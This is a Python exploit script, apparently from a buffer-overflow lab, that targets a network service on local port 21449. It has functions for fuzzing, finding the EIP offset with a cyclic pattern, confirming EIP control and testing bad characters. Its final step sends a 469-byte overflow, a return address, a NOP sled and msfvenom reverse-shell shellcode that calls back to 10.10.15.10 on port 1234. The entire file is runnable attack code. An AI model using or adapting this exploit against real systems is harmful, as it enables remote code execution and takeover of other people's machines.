#!/usr/bin/python3

import socket
from struct import pack


def fuzz():
    try:
        for i in range(0, 10000, 500):
            buffer = b"A"*i
            print("Fuzzing %s bytes" % i)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 21449))
            breakpoint()
            s.send(buffer)
            s.close()
    except:
        print("Could not establish a connection")


def eip_offset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    "9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8"
                    "Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A"
                    "i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al"
                    "7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6"
                    "Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5A"
                    "r6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au"
                    "5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4"
                    "Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3B"
                    "a4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd"
                    "3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2"
                    "Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1B"
                    "j2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm"
                    "1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0"
                    "Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9B"
                    "s0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu"
                    "9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8"
                    "Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7C"
                    "a8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd"
                    "7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6"
                    "Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5C"
                    "j6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm"
                    "5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 21449))
    s.send(pattern)
    s.close()


def eip_control():
    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 21449))
    s.send(payload)
    s.close()


def bad_chars():
    all_chars = bytes([
        0x01, 0x02 ,0x03, 0x04, 0x05, 0x06, 0x07,
        0x08, 0x09, 0x0B, 0x0C, 0x0E, 0x0F,
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
        0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
        0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
        0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
        0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
        0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
        0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
        0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
        0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
        0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
        0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
        0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
        0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
        0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
        0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
        0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
        0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
        0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
        0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
        0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
        0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
        0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
        0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
        0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
        0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
        0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
        0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
        0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
    ])

    offset = 469
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip + all_chars

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 21449))
    s.send(payload)
    s.close()


def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'
    buf =  b""
    buf += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
    buf += b"\x76\x0e\xfa\xed\xfb\x9f\x83\xee\xfc\xe2\xf4\x06\x05"
    buf += b"\x79\x9f\xfa\xed\x9b\x16\x1f\xdc\x3b\xfb\x71\xbd\xcb"
    buf += b"\x14\xa8\xe1\x70\xcd\xee\x66\x89\xb7\xf5\x5a\xb1\xb9"
    buf += b"\xcb\x12\x57\xa3\x9b\x91\xf9\xb3\xda\x2c\x34\x92\xfb"
    buf += b"\x2a\x19\x6d\xa8\xba\x70\xcd\xea\x66\xb1\xa3\x71\xa1"
    buf += b"\xea\xe7\x19\xa5\xfa\x4e\xab\x66\xa2\xbf\xfb\x3e\x70"
    buf += b"\xd6\xe2\x0e\xc1\xd6\x71\xd9\x70\x9e\x2c\xdc\x04\x33"
    buf += b"\x3b\x22\xf6\x9e\x3d\xd5\x1b\xea\x0c\xee\x86\x67\xc1"
    buf += b"\x90\xdf\xea\x1e\xb5\x70\xc7\xde\xec\x28\xf9\x71\xe1"
    buf += b"\xb0\x14\xa2\xf1\xfa\x4c\x71\xe9\x70\x9e\x2a\x64\xbf"
    buf += b"\xbb\xde\xb6\xa0\xfe\xa3\xb7\xaa\x60\x1a\xb2\xa4\xc5"
    buf += b"\x71\xff\x10\x12\xa7\x85\xc8\xad\xfa\xed\x93\xe8\x89"
    buf += b"\xdf\xa4\xcb\x92\xa1\x8c\xb9\xfd\x12\x2e\x27\x6a\xec"
    buf += b"\xfb\x9f\xd3\x29\xaf\xcf\x92\xc4\x7b\xf4\xfa\x12\x2e"
    buf += b"\xcf\xaa\xbd\xab\xdf\xaa\xad\xab\xf7\x10\xe2\x24\x7f"
    buf += b"\x05\x38\x6c\xf5\xff\x85\xf1\x95\xf4\x7e\x93\x9d\xfa"
    buf += b"\xe9\x29\x16\x1c\x87\xeb\xc9\xad\x85\x62\x3a\x8e\x8c"
    buf += b"\x04\x4a\x7f\x2d\x8f\x93\x05\xa3\xf3\xea\x16\x85\x0b"
    buf += b"\x2a\x58\xbb\x04\x4a\x92\x8e\x96\xfb\xfa\x64\x18\xc8"
    buf += b"\xad\xba\xca\x69\x90\xff\xa2\xc9\x18\x10\x9d\x58\xbe"
    buf += b"\xc9\xc7\x9e\xfb\x60\xbf\xbb\xea\x2b\xfb\xdb\xae\xbd"
    buf += b"\xad\xc9\xac\xab\xad\xd1\xac\xbb\xa8\xc9\x92\x94\x37"
    buf += b"\xa0\x7c\x12\x2e\x16\x1a\xa3\xad\xd9\x05\xdd\x93\x97"
    buf += b"\x7d\xf0\x9b\x60\x2f\x56\x0b\x2a\x58\xbb\x93\x39\x6f"
    buf += b"\x50\x66\x60\x2f\xd1\xfd\xe3\xf0\x6d\x00\x7f\x8f\xe8"
    buf += b"\x40\xd8\xe9\x9f\x94\xf5\xfa\xbe\x04\x4a"



    offset = 469
    buffer = b"A"*offset
    eip = pack('<L', 0x621014E3)
    nop = b"\x90"*32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 21449))
    s.send(payload)
    s.close()


exploit()
